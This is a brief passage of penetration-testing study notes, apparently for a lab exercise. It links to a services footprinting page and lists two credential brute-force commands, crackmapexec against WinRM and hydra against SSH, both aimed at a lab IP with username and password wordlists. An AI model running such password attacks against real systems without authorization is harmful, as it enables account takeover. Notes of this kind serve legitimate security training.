
- check [services footprinting](https://github.com/kiro6/penetration-testing-notes/blob/main/Penetration%20Testing/Footprinting/Services.md)

```bash
crackmapexec winrm 10.129.42.197 -u user.list -p password.list

hydra -L user.list -P password.list ssh://10.129.42.197
```
